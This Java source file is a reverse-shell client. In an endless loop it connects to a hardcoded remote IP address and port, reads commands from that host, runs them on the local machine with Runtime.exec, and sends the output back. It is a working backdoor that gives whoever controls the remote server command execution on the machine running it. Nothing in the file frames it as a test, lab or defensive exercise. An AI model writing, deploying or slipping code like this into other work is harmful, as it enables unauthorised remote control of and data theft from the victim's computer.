import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

public class Client2 {
	
	public static String execCommand(String alert ) {
		String command = alert;
		
		if(alert == null || alert.equals(""))
			command = "cls";

        String res = "";
        try {

	         Process process = Runtime.getRuntime().exec(command);

	         System.out.println("befor waitfor");
	         process.waitFor(1, TimeUnit.SECONDS);
	           System.out.println("after wiatfor");
	         BufferedInputStream bis = new BufferedInputStream(process.getInputStream());
	         BufferedReader br = new BufferedReader(new InputStreamReader(bis));
	         String line;
	         
	        
	         if (process.exitValue() != 0) {
	        	 bis = new BufferedInputStream(process.getErrorStream());
	        	 br = new BufferedReader(new InputStreamReader(bis));
	        	  while ((line = br.readLine()) != null) {
	        		  res += line+"\n";
	        	  }
	         }else {
	        	  while ((line = br.readLine()) != null) {
	        		  res += line+"\n";
	        	  }
	         }
	
	         bis.close();
	         br.close();
     } catch (IOException e) {
         e.printStackTrace();
     } catch (InterruptedException e) {
         e.printStackTrace();
     }catch(IllegalThreadStateException e) {
    	 e.printStackTrace();
    	 res = "还不支持交互命令.";
     }catch(Exception e) {
    	 res = "发生了个未知异常";
     }
        Log.write("result", res);
       return "\n>>>>\n"+res+"\n<<<<<<\n";
	}
	

	public static void main(String[] args) {
		while(true)
			try {
				Socket socket2 = new Socket("120.79.181.39", 6001);
				OutputStreamWriter writer = new OutputStreamWriter(socket2.getOutputStream(),"gbk");
			
		        BufferedReader br = new BufferedReader(new InputStreamReader(socket2.getInputStream()));
		    	Scanner s = new Scanner(socket2.getInputStream());
		    	
		    	Log.write("before exec", "****");
		    	String command = s.nextLine();
		    	Log.write("before exec", command);
		    	writer.write(execCommand(command));
		    	Log.write("abfer exec ", command);
		    	
				writer.flush();
		
				socket2.shutdownOutput();

			}catch (Exception e) {
				e.printStackTrace();
			}
	}
}
